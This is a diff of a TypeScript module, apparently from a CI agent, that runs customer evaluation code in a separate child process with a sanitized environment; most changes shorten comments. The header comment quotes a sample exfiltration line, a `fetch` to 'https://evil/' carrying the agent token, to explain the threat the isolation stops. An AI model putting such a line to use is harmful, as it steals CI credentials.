@@ -1,21 +1,17 @@
 /**
  * The eval child: the only process in which customer EVALUATION code runs.
  *
- * The agent forks this entry once per evaluation job — `__init__`, `__dynamic__`,
- * `__build__` and a global eval round — with an environment built by
- * `buildSanitizedEnv`, so the workflow module, its `filter`, its dynamic `env` /
- * `environment` / `concurrencyGroup` / `matrix` functions and any `DynamicJobFn`
- * load and execute where the agent's credentials are not.
+ * The agent forks it once per evaluation job (`__init__`, `__dynamic__`,
+ * `__build__`, a global eval round) with a `buildSanitizedEnv` environment, so
+ * the workflow module, its `filter`, its dynamic `env` / `environment` /
+ * `concurrencyGroup` / `matrix` functions and any `DynamicJobFn` execute where
+ * the agent's credentials are not. In the agent's own isolate, a pull request's
+ * `matrix: async ({ env }) => fetch('https://evil/', { body: env.KICI_AGENT_TOKEN })`
+ * would take the agent's identity.
  *
- * They used to run in the agent's own V8 isolate with the agent's `process.env`.
- * A `matrix: async ({ env }) => fetch('https://evil/', { body: env.KICI_AGENT_TOKEN })`
- * in a pull request was therefore enough to take the agent's identity.
- *
- * This file is the IPC shell only; the evaluations themselves live in
- * `eval-dispatch.ts`. Communication uses a message union of its own
- * (`AgentToEvalMessage` / `EvalToAgentMessage`), NOT the step runner's — see the
- * note above the union in `ipc-protocol.ts` for why sharing that one would be a
- * privilege expansion.
+ * IPC shell only; evaluations live in `eval-dispatch.ts`. It uses its own
+ * message union (`AgentToEvalMessage` / `EvalToAgentMessage`), NOT the step
+ * runner's — `ipc-protocol.ts` explains why sharing it would expand privilege.
  */
 
 import { toErrorMessage } from '@kici-dev/shared';
@@ -25,12 +21,12 @@ import type { AgentToEvalMessage, EvalToAgentMessage } from './ipc-protocol.js';
 import { installConsoleCapture } from '../console-capture.js';
 import { runEvalRequest } from './eval-dispatch.js';
 
-/** Send one message to the agent. A closed channel is not fatal — the agent has moved on. */
+/** A closed channel is not fatal — the agent has moved on. */
 function send(msg: EvalToAgentMessage): void {
   try {
     process.send?.(msg);
   } catch {
-    // IPC channel closed (the agent gave up on this evaluation).
+    // The agent gave up on this evaluation.
   }
 }
 
@@ -47,11 +43,8 @@ const pendingApiCalls = new Map<
 >();
 
 /**
- * Relay one `kici.*` call to the agent.
- *
- * `ctx.kici` is already handed to a `DynamicJobFn` and to a global-eval
- * generator, so this preserves what an evaluation has rather than granting it
- * something new. It is the only relay on the eval union.
+ * Relay one `kici.*` call to the agent. `ctx.kici` is already handed to a
+ * `DynamicJobFn` and a global-eval generator, so this grants nothing new.
  */
 function relayApiRequest(method: string, params: Record<string, unknown>): Promise<unknown> {
   const id = `eval-api-${++apiSeq}`;
@@ -65,8 +58,7 @@ const kici = buildKiciApi((method, params) => relayApiRequest(method, params ?? 
 
 // --- Bootstrap ---
 
-// Route customer `console.*` in a loaded module (and in every evaluation body)
-// onto the job's log rather than this child's stdout, which nothing reads.
+// Route customer `console.*` onto the job's log; this child's stdout is unread.
 installConsoleCapture();
 
 process.on('message', (msg: AgentToEvalMessage) => {
@@ -83,8 +75,7 @@ process.on('message', (msg: AgentToEvalMessage) => {
   void runEvalRequest(msg.request, { emit, kici }).then(
     (result) => {
       send({ type: 'eval.result', result });
-      // Exit rather than idle: a customer module may have left a timer or an
-      // open handle behind, and the child has nothing left to do.
+      // Exit rather than idle: a customer module may have left a timer or handle behind.
       process.exit(0);
     },
     (err) => {
